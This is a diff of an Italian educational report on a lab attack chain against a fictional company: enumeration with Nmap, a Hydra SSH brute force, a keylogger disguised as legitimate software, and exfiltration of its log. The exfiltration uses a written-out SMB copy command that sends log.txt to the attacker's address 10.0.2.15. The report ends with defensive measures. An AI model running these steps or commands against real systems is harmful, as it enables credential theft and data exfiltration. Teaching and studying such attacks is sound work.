@@ -28,7 +28,7 @@ L'obiettivo di questo report è analizzare dettagliatamente un attacco composto 
 
 ### Descrizione dell'attacco
 
-L'attacco analizzato in questo report inizia con la fase di enumerazione, dove l'attaccante raccoglie informazioni su un'azienda e i suoi dipendenti. Successivamente, viene lanciato un attacco di spearphishing mirato, seguito dall'iniezione di un keylogger nel sistema della sottoforma di software lecito. Il keylogger permette all'attaccante di rubare le credenziali di accesso (e qualsiasi cosa il bersaglio digiti), che vengono poi utilizzate per accedere a informazioni sensibili ed esfiltrarle, con potenziali impatti devastanti per l'azienda colpita.
+L'attacco analizzato in questo report inizia con la fase di enumerazione, dove l'attaccante raccoglie informazioni su un'azienda e i suoi dipendenti. Successivamente, viene lanciato un attacco di spearphishing mirato, seguito dall'iniezione di un keylogger nel sistema della sottoforma di software lecito. Il keylogger permette all'attaccante di rubare le credenziali di accesso (e qualsiasi cosa il bersaglio digiti), che vengono potrebbero venire utilizzate per accedere a informazioni sensibili ed esfiltrarle, con potenziali impatti devastanti per l'azienda colpita.
 
 <br>
 
@@ -52,13 +52,13 @@ Gli attaccanti utilizzano diverse tecniche per raccogliere informazioni, tra cui
 
 ### Scoperte nella fase di enumerazione
 
-Supponiamo che un attaccante voglia colpire un'azienda del settore finanziario di nome "Finanza Viva". Durante la fase di enumerazione, l'attaccante raccoglie molte informazioni pubbliche sulla azienza e sui dipendenti.
+Supponiamo che un attaccante voglia colpire un'azienda del settore finanziario di nome "Finanza Viva". Durante la fase di enumerazione, l'attaccante raccoglie molte informazioni pubbliche sulla azienda e sui suoi dipendenti.
 <!-- Durante la fase di enumerazione, l'attaccante può utilizzare LinkedIn per identificare un dipendente chiave, ad esempio un analista finanziario e, monitorando i suoi profili social, l'attaccante scopre che questo dipendente è particolarmente interessato agli investimenti e alle criptovalute. -->
-Dopo aver identificato l'azienda, supponiamo che l'attaccante trovi l'indirizzo IP 10.0.2.4 associato. A questo punto l'attaccante procede con la scansione della rete utilizzando Nmap:
+Dopo aver identificato l'azienda, supponiamo che l'attaccante attraverso Whois Lookup e Shodan, l'attaccante trovi l'indirizzo IP 10.0.2.4 associato (supponiamo non sia privato). A questo punto l'attaccante procede con la scansione di 10.0.2.4 utilizzando Nmap con l'opzione -sV (Service Version Detection: Nmap tenta di identificare quali servizi stanno girando sulle porte e quali versioni specifiche di quei servizi sono in uso):
 
 ![Descrizione immagine](./images/enumer_nmap.png)
 
-L'output rivela che l'azienda "Finanza Viva" ha configurato una macchina windows in cui il servizio SSH attivo sulla porta 22 e il servizio SMB attivo.
+L'output rivela che l'azienda "Finanza Viva" ha configurato una macchina windows in cui sono attivi i servizi SSH sulla porta 22 e SMB.
 
 ### Importanza per l'Attacco
 
@@ -70,7 +70,7 @@ La fase di enumerazione è cruciale perché fornisce all'attaccante le informazi
 
 ---
 
-Dopo aver identificato i servizi SSH e SMB aperti sulla rete dell'azienda "Finanza Viva", l'attaccante procede con l'utilizzo di Hydra per effettuare un attacco di forza bruta contro il servizio SSH all'indirizzo IP 10.0.2.4 e ottenere accesso ai sistemi. L'attaccante usa un dizionario costruitosi di nomi utenti User e di password Password per trovare le credenziali del servizio SSH.
+Dopo aver identificato i servizi SSH e SMB aperti sulla rete dell'azienda "Finanza Viva", l'attaccante procede con l'utilizzo di Hydra per effettuare un attacco di forza bruta contro il servizio SSH all'indirizzo IP 10.0.2.4 e ottenere accesso ai sistemi. L'attaccante usa le opzioni -L e -P per specificare rispettivamente due dizionari costruitosi di nomi utenti User e di password Password per trovare le credenziali del servizio SSH.
 
 ![Descrizione immagine](./images/hydra.png)
 
@@ -82,7 +82,7 @@ L'attaccante ottiene l'accesso alla shell nel dispositivo dell'azienda con l'ide
 
 ![Descrizione immagine](./images/Discover_utenti.png)
 
-L'attaccante scopre la presenza di un altro utente: Alessandro. Tra i documenti del bersaglio l'attaccante trova le informazioni di contatto di Alessandro come la mail. L'attaccante ritorna alla fase di enumerazione e attraverso LinkedIn scopre che Alessandro è un grande appassionato della finanza e all'interno della azienza è il responsabile della gestione dei conti bancari.
+L'attaccante scopre la presenza di un altro utente: Alessandro. Tra i documenti del bersaglio l'attaccante trova le informazioni di contatto di Alessandro come la mail. L'attaccante ritorna alla fase di enumerazione e attraverso LinkedIn scopre che Alessandro è un grande appassionato della finanza e all'interno della azienda è il responsabile della gestione dei conti bancari.
 
 ### Importanza per l'attacco
 
@@ -205,7 +205,7 @@ Questo comando crea una condivisione SMB denominata hax nella directory corrente
 
 ### 2. Navigazione sulla Macchina della Vittima
 
-Sulla macchina della vittima (il dispositivo di Alessandro), l'attaccante verifica la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
+Attraverso il protocollo SSH (scoperto precedentenente attivo sul dispositivo bersaglio con le relative credenziali valide), l'attaccante verifica la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
 
 ![Descrizione immagine](./images/Temp.png)
 
@@ -221,7 +221,7 @@ copy C:\Windows\temp\log.txt \\10.0.2.15\hax\log.txt
 
 Dove 10.0.2.15 è l'indirizzo IP del dispositivo dell'attaccante.
 
-L'attaccante può verificare che lo spostamento del file è avvenuto nel terminale che ha usato creare la condivisione SMB:
+L'attaccante può verificare che lo spostamento del file è avvenuto nel terminale che ha usato per creare la condivisione SMB:
 
 ![Descrizione immagine](./images/verificata_connessione.png)
 
@@ -237,10 +237,11 @@ Esempio del file log.txt ottenuto:
 
 Le aziende devono adottare misure di sicurezza efficaci e formare i propri dipendenti per prevenire e mitigare tali attacchi. Per proteggersi da questo tipo di attacco, le aziende possono adottare diverse misure di sicurezza:
 
++ Configurazione di Firewall e Regole di Accesso: Limitare l'accesso ai servizi SMB solo a dispositivi e utenti autorizzati.
 + Gestione delle Password: Cambiare le password di default e utilizzare password non comuni e possibilmente non esistenti nei dizionari.
 + Formazione dei Dipendenti: Educare i dipendenti sui rischi del phishing e su come riconoscere email sospette.
 + Monitoraggio del Traffico di Rete: Monitorare e analizzare il traffico di rete per rilevare attività sospette.
-+ Configurazione di Firewall e Regole di Accesso: Limitare l'accesso ai servizi SMB solo a dispositivi e utenti autorizzati.
+
 
 </div>
 
